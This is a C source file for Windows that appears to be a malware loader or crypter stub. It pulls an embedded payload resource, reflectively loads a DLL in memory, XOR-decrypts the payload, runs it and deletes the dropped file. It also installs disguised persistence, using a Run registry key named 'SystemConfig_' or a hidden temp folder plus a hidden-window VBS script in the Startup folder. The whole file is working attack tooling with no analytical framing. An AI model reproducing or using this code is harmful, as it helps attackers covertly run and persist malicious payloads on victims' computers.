#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <tlhelp32.h>

HMODULE g_hDll = NULL;

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

void create_persistence(const char *method) {
    if (strcmp(method, "None") == 0) {
        return;
    }
    char bin_path[MAX_PATH];
    GetModuleFileNameA(NULL, bin_path, MAX_PATH);
    char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;

    if (strcmp(method, "Registry Run Key") == 0) {
        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        if (result == ERROR_SUCCESS) {
            char rand_str[9];
            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
            char hidden_service[32];
            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
            RegSetValueExA(hKey, hidden_service, 0, REG_SZ, (const BYTE*)bin_path, strlen(bin_path) + 1);
            RegCloseKey(hKey);
        }
        return;
    }
    if (strcmp(method, "Startup Folder") == 0) {
        char temp_dir[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_dir);

        // Count dot-prefixed folders in temp directory
        char search_path[MAX_PATH];
        snprintf(search_path, MAX_PATH, "%s\\.*", temp_dir);
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(search_path, &findData);
        int dot_folder_count = 0;
        char existing_folder[MAX_PATH] = "";
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                        dot_folder_count++;
                        if (dot_folder_count == 1) {
                            snprintf(existing_folder, MAX_PATH, "%s\\%s", temp_dir, findData.cFileName);
                        }
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }

        char hidden_folder[MAX_PATH];
        if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
            // Reuse the first existing dot-prefixed folder
            strncpy(hidden_folder, existing_folder, MAX_PATH);
        } else {
            // Create a new folder
            char rand_str[9];
            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
            snprintf(hidden_folder, MAX_PATH, "%s\\.%.8s", temp_dir, rand_str);
            CreateDirectoryA(hidden_folder, NULL);
        }

        char hidden_binary[MAX_PATH];
        snprintf(hidden_binary, MAX_PATH, "%s\\%s", hidden_folder, bin_name);
        CopyFileA(bin_path, hidden_binary, FALSE);

        char appdata[MAX_PATH];
        if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) {
            return;
        }
        char startup_folder[MAX_PATH];
        snprintf(startup_folder, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata);
        CreateDirectoryA(startup_folder, NULL);

        char vbs_path[MAX_PATH];
        char rand_str[9];
        snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
        char hidden_service[32];
        snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
        snprintf(vbs_path, MAX_PATH, "%s\\%.8s.vbs", startup_folder, hidden_service);
        char vbs_content[512];
        snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);
        HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return;
        }
        DWORD bytesWritten;
        WriteFile(hFile, vbs_content, strlen(vbs_content), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
    char msg[256];
    if (!dll_data || dll_size < sizeof(IMAGE_DOS_HEADER)) {
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dll_data;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    if (dosHeader->e_lfanew >= dll_size) {
        return NULL;
    }

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)dll_data + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    LPVOID imageBase = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        return NULL;
    }

    memcpy(imageBase, dll_data, ntHeader->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData && section[i].PointerToRawData + section[i].SizeOfRawData <= dll_size) {
            memcpy((BYTE*)imageBase + section[i].VirtualAddress, (BYTE*)dll_data + section[i].PointerToRawData, section[i].SizeOfRawData);
        } else if (section[i].SizeOfRawData) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size && (BYTE*)importDesc < (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
        while (importDesc->Name) {
            LPCSTR dllName = (LPCSTR)((BYTE*)imageBase + importDesc->Name);
            if ((BYTE*)dllName >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                VirtualFree(imageBase, 0, MEM_RELEASE);
                return NULL;
            }
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                VirtualFree(imageBase, 0, MEM_RELEASE);
                return NULL;
            }
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)imageBase + importDesc->FirstThunk);
            while (thunk->u1.AddressOfData) {
                if ((BYTE*)thunk >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                    VirtualFree(imageBase, 0, MEM_RELEASE);
                    return NULL;
                }
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                    if (!thunk->u1.Function) {
                        VirtualFree(imageBase, 0, MEM_RELEASE);
                        return NULL;
                    }
                } else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)imageBase + thunk->u1.AddressOfData);
                    if ((BYTE*)importByName >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                        VirtualFree(imageBase, 0, MEM_RELEASE);
                        return NULL;
                    }
                    thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, importByName->Name);
                    if (!thunk->u1.Function) {
                        VirtualFree(imageBase, 0, MEM_RELEASE);
                        return NULL;
                    }
                }
                thunk++;
            }
            importDesc++;
        }
    }

    DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0 && ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        if ((BYTE*)relocation >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return NULL;
        }
        while (relocation->VirtualAddress) {
            if ((BYTE*)relocation >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                VirtualFree(imageBase, 0, MEM_RELEASE);
                return NULL;
            }
            DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *relocData = (WORD*)(relocation + 1);
            for (DWORD i = 0; i < numRelocs; i++) {
                if ((BYTE*)&relocData[i] >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                    VirtualFree(imageBase, 0, MEM_RELEASE);
                    return NULL;
                }
                int type = relocData[i] >> 12;
                int offset = relocData[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    DWORD64 *address = (DWORD64*)((BYTE*)imageBase + relocation->VirtualAddress + offset);
                    if ((BYTE*)address >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
                        VirtualFree(imageBase, 0, MEM_RELEASE);
                        return NULL;
                    }
                    *address += delta;
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
        }
    }

    typedef BOOL (WINAPI *DllMain_t)(HMODULE, DWORD, LPVOID);
    DllMain_t dllMain = (DllMain_t)((BYTE*)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    if ((BYTE*)dllMain < (BYTE*)imageBase || (BYTE*)dllMain >= (BYTE*)imageBase + ntHeader->OptionalHeader.SizeOfImage) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
    }
    if (!dllMain((HMODULE)imageBase, DLL_PROCESS_ATTACH, NULL)) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
    }

    return (HMODULE)imageBase;
}

int main(int argc, char *argv[]) {
    HRSRC hConfigRes = NULL;
    HGLOBAL hData;
    void *lpData = NULL;
    DWORD bytesRead = 0;
    HMODULE hDllModule = NULL;

    HMODULE hModule = GetModuleHandle(NULL);
    hConfigRes = FindResource(hModule, "CONFIG", "PAYLOAD");
    if (hConfigRes) {
        hData = LoadResource(hModule, hConfigRes);
        if (!hData) {
            return 1;
        }
        lpData = LockResource(hData);
        if (!lpData) {
            return 1;
        }
        bytesRead = SizeofResource(hModule, hConfigRes);
        if (bytesRead == 0) {
            return 1;
        }
    } else {
        HRSRC hDllRes = FindResource(hModule, "DLL", "PAYLOAD");
        if (!hDllRes) {
            return 1;
        }
        HGLOBAL hDllGlobal = LoadResource(hModule, hDllRes);
        if (!hDllGlobal) {
            return 1;
        }
        void *dll_data = LockResource(hDllGlobal);
        if (!dll_data) {
            return 1;
        }
        DWORD dll_size = SizeofResource(hModule, hDllRes);
        if (dll_size == 0) {
            return 1;
        }

        hDllModule = LoadDllInMemory(dll_data, dll_size);
        if (!hDllModule) {
            return 1;
        }

        hConfigRes = FindResource(hDllModule, "CONFIG", "PAYLOAD");
        if (!hConfigRes) {
            VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        hData = LoadResource(hDllModule, hConfigRes);
        if (!hData) {
            VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        lpData = LockResource(hData);
        if (!lpData) {
            VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        bytesRead = SizeofResource(hDllModule, hConfigRes);
        if (bytesRead == 0) {
            VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
    }

    typedef struct {
        char key_hex[65];
        unsigned char persistence;
        unsigned int junk_url_count;
        unsigned long long payload_size;
        unsigned char load_in_memory;
        unsigned char payload_data[1];
    } PayloadConfig;
    PayloadConfig *config = (PayloadConfig *)lpData;
    const char *persistence_method = config->persistence == 0 ? "None" : config->persistence == 1 ? "Startup Folder" : config->persistence == 2 ? "Registry Run Key" : "None";
    int load_in_memory = (config->load_in_memory == 1);
    unsigned long long payload_size = config->payload_size;
    unsigned char *encrypted_payload = config->payload_data;

    create_persistence(persistence_method);

    if (!load_in_memory) {
        unsigned char key[32];
        hex_to_bytes(config->key_hex, key, 32);
        unsigned char *decrypted_payload = malloc(payload_size);
        if (!decrypted_payload) {
            if (hDllModule) VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        memcpy(decrypted_payload, encrypted_payload, payload_size);
        for (unsigned long long i = 0; i < payload_size; i++) {
            decrypted_payload[i] ^= key[i % 32];
        }

        char bin_path[MAX_PATH];
        GetModuleFileNameA(NULL, bin_path, MAX_PATH);
        char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
        char decrypted_path[MAX_PATH];
        snprintf(decrypted_path, MAX_PATH, "decrypted_%s", bin_name);
        HANDLE hFile = CreateFileA(decrypted_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            free(decrypted_payload);
            if (hDllModule) VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        DWORD bytesWritten;
        if (!WriteFile(hFile, decrypted_payload, (DWORD)payload_size, &bytesWritten, NULL)) {
            CloseHandle(hFile);
            free(decrypted_payload);
            if (hDllModule) VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        CloseHandle(hFile);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessA(decrypted_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            free(decrypted_payload);
            DeleteFileA(decrypted_path);
            if (hDllModule) VirtualFree(hDllModule, 0, MEM_RELEASE);
            return 1;
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(decrypted_payload);
        DeleteFileA(decrypted_path);
        if (hDllModule) VirtualFree(hDllModule, 0, MEM_RELEASE);
        return 0;
    }

    g_hDll = hDllModule;

    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}